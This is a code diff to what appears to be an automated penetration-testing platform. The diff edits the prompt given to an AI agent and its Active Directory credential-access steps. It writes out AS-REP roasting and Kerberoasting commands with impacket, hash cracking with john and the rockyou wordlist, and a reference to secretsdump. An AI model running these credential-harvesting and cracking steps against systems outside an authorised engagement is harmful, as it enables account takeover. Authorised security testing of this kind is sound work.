@@ -66,15 +66,17 @@ Phase 3 — Credential Access (requires ARTIFACTS.users to be non-empty)
   Do NOT start Phase 3 without at least one user in ARTIFACTS.
 
   AS-REP Roasting (try first — no creds required):
-    impacket-GetNPUsers <DOMAIN>/ -no-pass -request -dc-ip <DC>
+    impacket-GetNPUsers <DOMAIN>/ -no-pass -request -dc-ip <DC> -outputfile <SESSION_OUTPUT_DIR>/asrep_hashes.txt
     Save hashes: {"type":"hash","user":"<username>","value":"$krb5asrep$23$..."}
 
   Kerberoasting (requires SPNs in ARTIFACTS):
-    impacket-GetUserSPNs <DOMAIN>/<user>:<pass> -dc-ip <DC> -request  (authenticated)
-    OR: impacket-GetUserSPNs <DOMAIN>/ -no-pass -request -dc-ip <DC>  (anonymous if allowed)
+    impacket-GetUserSPNs <DOMAIN>/<user>:<pass> -dc-ip <DC> -request -outputfile <SESSION_OUTPUT_DIR>/kerb_hashes.txt  (authenticated)
+    OR: impacket-GetUserSPNs <DOMAIN>/ -no-pass -request -dc-ip <DC> -outputfile <SESSION_OUTPUT_DIR>/kerb_hashes.txt  (anonymous if allowed)
     Save hashes: {"type":"hash","user":"<SPN-account>","value":"$krb5tgs$23$*..."}
 
-  Hash cracking: john <hashfile> --format=krb5asrep OR krb5tgs --wordlist=/wordlists/Passwords/Leaked-Databases/rockyou.txt
+  IMPORTANT: Always use -outputfile with the SESSION OUTPUT DIR path shown in your prompt for GetNPUsers (asrep_hashes.txt) and GetUserSPNs (kerb_hashes.txt). Then run john against those paths.
+
+  Hash cracking: john <SESSION_OUTPUT_DIR>/asrep_hashes.txt --format=krb5asrep OR john <SESSION_OUTPUT_DIR>/kerb_hashes.txt --format=krb5tgs --wordlist=/wordlists/Passwords/Leaked-Databases/rockyou.txt
     Cracked passwords are automatically saved to ARTIFACTS.creds by the platform after john completes.
 
   Secretsdump (if any creds available in ARTIFACTS — this is the highest-yield move when you have creds):
@@ -230,6 +232,7 @@ async def build_agent_prompt(campaign: Campaign, db: AsyncSession) -> str:
     primary = _primary_target(scope, kind)
 
     scope_str = "\n".join(f"  - {s}" for s in scope)
+    data_dir = f"/data/{sess.id}" if sess else "/data/session"
 
     # Filter tools by scope_type and agent_mode.
     # A tool matches if its scope_types list contains `kind`, OR if scope_types is
@@ -380,6 +383,7 @@ async def build_agent_prompt(campaign: Campaign, db: AsyncSession) -> str:
 
 SCOPE (test all entries — work through each systematically):
 {scope_str}
+SESSION OUTPUT DIR (write all tool output files here — use this path for -outputfile flags and any file redirects): {data_dir}/
 {context_section}
 ENGAGEMENT METHODOLOGY ({eng_label} — follow phases in order):
 {methodology_str}
